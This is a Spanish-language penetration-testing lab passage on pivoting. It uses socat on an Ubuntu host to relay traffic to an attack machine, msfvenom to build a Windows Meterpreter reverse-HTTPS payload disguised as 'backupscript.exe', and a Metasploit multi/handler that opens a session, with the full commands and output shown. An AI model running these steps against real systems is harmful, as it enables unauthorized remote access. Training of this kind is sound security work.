[Socat](https://linux.die.net/man/1/socat) es una herramienta de relay bidireccional que puede crear sockets entre `2` canales de red independientes sin necesidad de utilizar SSH tunneling. Actúa como un redireccionador que puede escuchar en un host y puerto y redirigir esos datos a otra dirección IP y puerto. Podemos iniciar el listener de Metasploit usando el mismo comando mencionado en la sección anterior en nuestro host de ataque, y podemos iniciar `socat` en el servidor Ubuntu.

### Starting Socat Listener

```r
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat escuchará en localhost en el puerto `8080` y redirigirá todo el tráfico al puerto `80` en nuestro host de ataque (10.10.14.18). Una vez que nuestro redireccionador esté configurado, podemos crear un payload que se conectará a nuestro redireccionador, que está ejecutándose en nuestro servidor Ubuntu. También iniciaremos un listener en nuestro host de ataque porque tan pronto como socat reciba una conexión de un objetivo, redirigirá todo el tráfico al listener de nuestro host de ataque, donde obtendremos una shell.

### Creating the Windows Payload

```r
[!bash!]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Recuerda que debemos transferir este payload al host de Windows. Podemos utilizar algunas de las mismas técnicas utilizadas en secciones anteriores para hacerlo.

### Starting MSF Console

```r
[!bash!]$ sudo msfconsole

<SNIP>
```

### Configuring & Starting the multi/handler

```r
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Podemos probar esto ejecutando nuestro payload en el host de Windows nuevamente, y deberíamos ver una conexión de red desde el servidor Ubuntu esta vez.

### Establishing the Meterpreter Session

```r
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```